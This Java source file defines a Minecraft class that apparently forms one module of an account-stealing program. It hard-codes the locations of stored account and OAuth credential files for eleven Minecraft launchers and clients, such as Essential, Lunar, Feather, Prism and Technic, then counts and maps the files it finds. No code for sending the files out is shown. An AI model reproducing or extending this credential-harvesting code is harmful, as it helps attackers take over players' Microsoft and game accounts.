package dev.client.module.applications;

import java.io.*;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Minecraft {
    private final File[] minecraftFiles;
    private File servers;

    public Minecraft() {
        String mc = System.getenv("APPDATA") + "/.minecraft/";
        minecraftFiles = new File[] {
                new File(mc + "/essential/microsoft_accounts.json"),
                new File(mc + "/config/ias.json"),
                new File(mc + "/LabyMod/accounts.json"),
                new File(mc + "/Impact/alts.json"),
                new File(mc + "/meteor-client/accounts.nbt"),
                new File(System.getenv("APPDATA") + "/Badlion Client/accounts.json"),
                new File(System.getenv("APPDATA") + "/.feather/accounts.json"),
                new File(System.getenv("APPDATA") + "/PolyMC/accounts.json"),
                new File(System.getenv("APPDATA") + "/PrismLauncher/accounts.json"),
                new File(System.getenv("APPDATA") + "/.technic/oauth/StoredCredential"),
                new File(System.getProperty("user.home") + "/.lunarclient/settings/game/accounts.json"),
        };
    }


    public int countFiles() {
        int count = 0;
        for (File file : minecraftFiles) {
            if (file != null && file.exists()) {
                count++;
            }
        }
        return count;
    }

    public Map<String, File> getAllFiles() {
        Map<String, File> minecraftFilesMap = new HashMap<>();
        String[] names = {"Essential", "Ias", "Laby", "Impact", "Meteor", "Badlion", "Feather", "Polymc", "Prism", "Technic", "Lunar"};
        for (int i = 0; i < minecraftFiles.length; i++) {
            minecraftFilesMap.put(names[i], minecraftFiles[i]);
        }
        return minecraftFilesMap;
    }
}